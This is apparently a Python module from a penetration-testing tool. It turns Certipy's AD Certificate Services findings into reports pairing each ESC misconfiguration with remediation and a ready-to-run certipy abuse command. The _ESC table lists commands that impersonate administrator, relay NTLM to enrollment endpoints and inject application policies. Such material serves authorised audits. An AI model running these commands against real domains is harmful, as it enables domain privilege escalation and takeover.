"""Import Certipy ADCS output and turn its ESC findings into a provable runbook.

`certipy find -json` writes a JSON inventory of the AD Certificate Services CAs and
templates, and - crucially - flags the ESC misconfigurations it detects under a
`[!] Vulnerabilities` key on each object. This module reads that JSON (stdlib only,
no network) and, for every ESCx it reports, emits a finding carrying the exact
`certipy` command to PROVE / abuse it, pre-filled with the operator's credentials
so it is copy-paste ready. It generates no exploit code; certipy does the work.
"""
from __future__ import annotations

import json
import os

# ESC id -> (severity, one-line what-it-is, the certipy abuse command, remediation).
# Commands use <user>/<pass>/<DOMAIN>/<dc>/<CA>/<TEMPLATE> tokens; the CA/template
# are filled here, the credentials by bloodhound.fill_creds so they land ready.
_ESC = {
    "ESC1": ("critical", "Template allows requester-supplied SAN + client auth, low-priv enroll",
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' "
             "-template '<TEMPLATE>' -upn administrator@<DOMAIN>  &&  "
             "certipy auth -pfx administrator.pfx -dc-ip <dc>",
             "Disable 'Enrollee supplies subject', require manager approval, or restrict enrolment."),
    "ESC2": ("critical", "Template has Any Purpose / SubCA EKU (usable for auth)",
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' "
             "-template '<TEMPLATE>' -upn administrator@<DOMAIN>  &&  certipy auth -pfx administrator.pfx",
             "Remove the Any Purpose EKU; scope the template's usage."),
    "ESC3": ("high", "Enrolment Agent template -> request on behalf of any user",
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>'  # agent cert, then:\n"
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template User "
             "-on-behalf-of '<DOMAIN>\\administrator' -pfx <user>.pfx",
             "Restrict the Enrolment Agent template / require approval."),
    "ESC4": ("high", "You have write over the template -> reconfigure it into ESC1",
             "certipy template -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -template '<TEMPLATE>' "
             "-write-default-configuration  # makes it vuln, then exploit as ESC1 (see ESC1)",
             "Restrict Write/GenericAll on the certificate-template object to tier-0."),
    "ESC5": ("high", "You control a PKI object (CA computer / container) via its ACL",
             "impacket-dacledit / bloodyAD to abuse the ACL on the PKI object, then reconfigure "
             "the CA or a template into ESC1 and request a cert",
             "Restrict control of PKI objects (CA, NTAuthCertificates, templates) to tier-0."),
    "ESC6": ("critical", "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 -> any template honours a SAN",
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template User "
             "-upn administrator@<DOMAIN>  &&  certipy auth -pfx administrator.pfx",
             "certutil -setreg CA\\policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2; restart the CA."),
    "ESC7": ("high", "You hold ManageCA / ManageCertificates on the CA",
             "certipy ca -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -add-officer <user>  &&  "
             "certipy ca -ca '<CA>' -enable-template SubCA  # then request+issue a SubCA cert",
             "Remove ManageCA/ManageCertificates from non-tier-0 principals."),
    "ESC8": ("critical", "Web/NDES enrolment enabled -> relay NTLM to HTTP enrolment",
             "certipy relay -target 'http://<CA>/certsrv/certfnsh.asp' -template DomainController  # then "
             "coerce a DC (petitpotam / coercer), then certipy auth -pfx dc.pfx",
             "Disable web enrolment, enforce HTTPS+EPA, and require channel binding."),
    "ESC9": ("high", "Certificate has no security extension (weak account mapping)",
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>' "
             "# with GenericWrite on a victim, set its userPrincipalName then auth as it",
             "Enable strong certificate mapping (KB5014754 Full Enforcement)."),
    "ESC10": ("high", "Weak certificate mapping on the DCs (StrongCertificateBinding off)",
              "certipy req/auth abusing the weak UPN/altSecID mapping (see certipy ESC10 docs)",
              "Set StrongCertificateBindingEnforcement=2; enable strong mapping."),
    "ESC11": ("high", "IF_ENFORCEENCRYPTICERTREQUEST off -> relay to the CA over RPC (ICPR)",
              "certipy relay -target 'rpc://<CA>' -template DomainController  # + coerce a DC",
              "Enable IF_ENFORCEENCRYPTICERTREQUEST (encrypt ICPR requests)."),
    "ESC13": ("high", "Template issuance policy is linked to a privileged group",
              "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>'  "
              "# the issued cert grants the linked group's rights",
              "Unlink the issuance policy from privileged groups."),
    "ESC15": ("critical", "EKUwu (CVE-2024-49019): inject application policies on a v1 template",
              "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>' "
              "-application-policies '1.3.6.1.4.1.311.20.2.1'  # Enrolment Agent -> ESC3",
              "Patch (Nov-2024); remove enrol rights on v1 templates."),
}
_DEFAULT = ("high", "ADCS misconfiguration flagged by Certipy",
            "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>'",
            "Review the template/CA configuration per Certipy's guidance.")

_VULN_KEYS = ("[!] Vulnerabilities", "Vulnerabilities")
_TEMPLATE_SECTIONS = ("Certificate Templates", "certificate_templates")
_CA_SECTIONS = ("Certificate Authorities", "certificate_authorities")


def _safe_load(path: str):
    try:
        with open(path, "r", errors="replace") as fh:
            return json.loads(fh.read())
    except (OSError, ValueError):
        return None


def is_certipy(path: str) -> bool:
    """True if `path` is a Certipy `find -json` output (has a CA/template section)."""
    if not (os.path.isfile(path) and path.lower().endswith(".json")):
        return False
    data = _safe_load(path)
    if not isinstance(data, dict):
        return False
    return any(k in data for k in _TEMPLATE_SECTIONS + _CA_SECTIONS)


def _section(data: dict, names) -> dict:
    for n in names:
        if isinstance(data.get(n), dict):
            return data[n]
    return {}


def _get(obj: dict, *keys, default=""):
    for k in keys:
        if k in obj and obj[k] not in (None, ""):
            return obj[k]
    return default


def _vulns(obj: dict) -> dict:
    for k in _VULN_KEYS:
        v = obj.get(k)
        if isinstance(v, dict):
            return v
    return {}


def _enroll_principals(obj: dict) -> str:
    perms = obj.get("Permissions") or {}
    enroll = (perms.get("Enrollment Permissions") or {})
    rights = enroll.get("Enrollment Rights") or obj.get("Enrollment Rights") or []
    if isinstance(rights, str):
        rights = [rights]
    elif isinstance(rights, dict):        # some Certipy versions map principal->right
        rights = list(rights)
    elif not isinstance(rights, list):
        rights = []
    return ", ".join(str(r) for r in rights[:6])


def _finding(cat, sev, title, principal, target, detail, cmd, rem):
    return {"category": cat, "severity": sev, "title": title, "principal": principal,
            "target": target, "detail": detail, "tool": "certipy", "command": cmd,
            "remediation": rem}


def findings(path: str) -> list[dict]:
    """Parse a Certipy JSON and return AD Findings for each ESC it flags. Commands
    carry <user>/<pass>/<DOMAIN>/<dc> tokens for bloodhound.fill_creds to fill in."""
    data = _safe_load(path)
    if not isinstance(data, dict):
        return []
    out: list[dict] = []

    def emit(obj, name, ca_name):
        who = _enroll_principals(obj)
        for esc, desc in _vulns(obj).items():
            eid = str(esc).strip().upper()
            sev, what, cmd_t, rem = _ESC.get(eid, _DEFAULT)
            cmd = cmd_t.replace("<TEMPLATE>", name).replace("<CA>", ca_name or name)
            detail = str(desc) if desc else what
            out.append(_finding(
                f"adcs-{eid.lower()}", sev, f"ADCS {eid}: {what}",
                who or "(see enrolment rights)", f"{name}" + (f" @ {ca_name}" if ca_name else ""),
                detail, cmd, rem))

    templates = _section(data, _TEMPLATE_SECTIONS)
    cas = _section(data, _CA_SECTIONS)
    # Map a template to a CA name so the command's -ca is right (best-effort).
    default_ca = ""
    for ca in cas.values():
        if isinstance(ca, dict):
            default_ca = _get(ca, "CA Name", "CA_Name", default=default_ca) or default_ca
    for tpl in templates.values():
        if not isinstance(tpl, dict):
            continue
        name = _get(tpl, "Template Name", "Template_Name", "Name", default="<TEMPLATE>")
        cas_for = tpl.get("Certificate Authorities") or tpl.get("CAs") or []
        ca_name = (cas_for[0] if isinstance(cas_for, list) and cas_for else default_ca)
        emit(tpl, name, ca_name)
    for ca in cas.values():
        if not isinstance(ca, dict):
            continue
        name = _get(ca, "CA Name", "CA_Name", "Name", default="<CA>")
        emit(ca, name, name)

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    out.sort(key=lambda f: order.get(f["severity"], 5))
    return out
